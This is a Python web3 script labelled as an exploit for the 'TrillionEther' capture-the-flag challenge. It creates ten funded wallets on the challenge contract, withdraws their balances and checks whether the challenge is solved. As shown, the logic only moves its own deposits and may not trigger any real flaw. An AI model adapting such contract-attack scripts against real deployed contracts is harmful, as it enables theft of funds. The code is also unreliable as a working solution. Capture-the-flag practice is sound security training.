
import sys
import time
from web3 import Web3
from web3.exceptions import TransactionNotFound, BadFunctionCallOutput
from eth_account import Account

# ABI定義
ABI = [
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "walletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "name": "wallets",
        "outputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            },
            {
                "internalType": "uint256",
                "name": "balance",
                "type": "uint256"
            },
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

def get_input(prompt):
    try:
        return input(prompt)
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        sys.exit(0)

def main():
    print("=== TrillionEther CTF Exploit Script ===\n")

    # ユーザーからの入力取得
    rpc_endpoint = get_input("RPC Endpoint (e.g., http://localhost:8545): ").strip()
    private_key = get_input("Private Key: ").strip()
    contract_address = get_input("Contract Address: ").strip()

    # Web3のセットアップ
    try:
        web3 = Web3(Web3.HTTPProvider(rpc_endpoint))
        if not web3.is_connected():
            print("Error: RPC Endpointに接続できませんでした。")
            sys.exit(1)
        else:
            print("RPC Endpointに接続しました。")
    except Exception as e:
        print(f"Error connecting to RPC Endpoint: {e}")
        sys.exit(1)

    # アカウントの設定
    try:
        account = Account.from_key(private_key)
        wallet_address = account.address
        print(f"あなたのアドレス: {wallet_address}")
    except Exception as e:
        print(f"Error with the provided private key: {e}")
        sys.exit(1)

    # アカウントの残高確認
    try:
        balance = web3.eth.get_balance(wallet_address)
        balance_eth = web3.from_wei(balance, 'ether')
        print(f"アカウントの残高: {balance_eth} ETH")
        if balance <= 0:
            print("Error: アカウントの残高が不足しています。")
            sys.exit(1)
    except Exception as e:
        print(f"Error fetching account balance: {e}")
        sys.exit(1)

    # コントラクトインスタンスの作成
    try:
        contract = web3.eth.contract(address=web3.to_checksum_address(contract_address), abi=ABI)
    except Exception as e:
        print(f"Error setting up contract: {e}")
        sys.exit(1)

    # ウォレット作成関数
    def create_wallet(name, value_eth):
        try:
            # 最新の nonce を取得
            nonce = web3.eth.get_transaction_count(wallet_address)

            # 名前をbytes32に変換（右側にパディング）
            name_bytes = web3.to_bytes(text=name)
            if len(name_bytes) > 32:
                name_bytes32 = name_bytes[:32]
            else:
                name_bytes32 = name_bytes.ljust(32, b'\0')

            tx = contract.functions.createWallet(
                name_bytes32
            ).build_transaction({
                'from': wallet_address,
                'value': web3.to_wei(value_eth, 'ether'),
                'nonce': nonce,
                'gas': 300000,  # ガスリミットを適切に設定
                'gasPrice': web3.to_wei('5', 'gwei')  # ガス価格を設定
            })
            signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)
            tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
            print(f"createWallet トランザクション送信: {tx_hash.hex()}")
            receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            if receipt.status == 1:
                print(f"createWallet トランザクション成功: {tx_hash.hex()}")
            else:
                print(f"createWallet トランザクション失敗: {tx_hash.hex()}")
        except Exception as e:
            print(f"createWallet 実行時エラー: {e}")

    # withdraw関数
    def withdraw(wallet_id, amount_eth):
        try:
            # 最新の nonce を取得
            nonce = web3.eth.get_transaction_count(wallet_address)

            tx = contract.functions.withdraw(
                wallet_id,
                web3.to_wei(amount_eth, 'ether')
            ).build_transaction({
                'from': wallet_address,
                'nonce': nonce,
                'gas': 200000,  # ガスリミットを適切に設定
                'gasPrice': web3.to_wei('5', 'gwei')  # ガス価格を設定
            })
            signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)
            tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
            print(f"withdraw トランザクション送信: {tx_hash.hex()}")
            receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            if receipt.status == 1:
                print(f"withdraw トランザクション成功: {tx_hash.hex()}")
            else:
                print(f"withdraw トランザクション失敗: {tx_hash.hex()}")
        except Exception as e:
            print(f"withdraw 実行時エラー: {e}")

    # wallets[i].balance と wallets[i].owner を確認する関数
    def get_wallet_info(wallet_id):
        try:
            wallet = contract.functions.wallets(wallet_id).call()
            name = wallet[0].decode('utf-8').rstrip('\x00')
            balance = web3.from_wei(wallet[1], 'ether')
            owner = wallet[2]
            print(f"Wallet {wallet_id}: Name='{name}', Balance={balance} ETH, Owner={owner}")
            return wallet
        except Exception as e:
            print(f"Error fetching wallet {wallet_id} info: {e}")
            return None

    # isSolved関数
    def check_solved():
        try:
            solved = contract.functions.isSolved().call()
            print(f"isSolved(): {solved}")
            return solved
        except BadFunctionCallOutput:
            print("isSolved() 関数の呼び出しに失敗しました。コントラクトが正しくデプロイされていない可能性があります。")
            return False
        except Exception as e:
            print(f"isSolved() 呼び出し時エラー: {e}")
            return False

    # エクスプロイト実行
    try:
        num_wallets = 10  # 作成するウォレットの数
        value_per_wallet = 0.09  # 各ウォレットに送るETHの量を0.09 ETHに設定

        print(f"\n{num_wallets} 個のウォレットを作成中...")
        for i in range(num_wallets):
            wallet_name = f"AttackWallet{i}"
            create_wallet(wallet_name, value_per_wallet)
            time.sleep(1)  # 連続実行を避けるための待機

        # 作成したウォレットの情報を確認
        print("\n作成したウォレットの情報を確認中...")
        for i in range(num_wallets):
            get_wallet_info(i)
            time.sleep(0.5)

        print("\n各ウォレットからETHを引き出しています...")
        for i in range(num_wallets):
            # 各ウォレットのバランスを取得
            wallet = contract.functions.wallets(i).call()
            wallet_balance_eth = web3.from_wei(wallet[1], 'ether')
            if wallet_balance_eth > 0:
                withdraw_amount = wallet_balance_eth  # 全額引き出す
                withdraw(wallet_id=i, amount_eth=withdraw_amount)
            else:
                print(f"Wallet {i} のバランスが0 ETHのため、引き出しをスキップします。")
            time.sleep(1)  # 連続実行を避けるための待機

        print("\nisSolved() の状態を確認しています...")
        if check_solved():
            print("フラグを取得する条件を満たしました！")
        else:
            print("エクスプロイトが完了していないか、条件を満たしていません。")
    except Exception as e:
        print(f"エクスプロイト中にエラーが発生しました: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

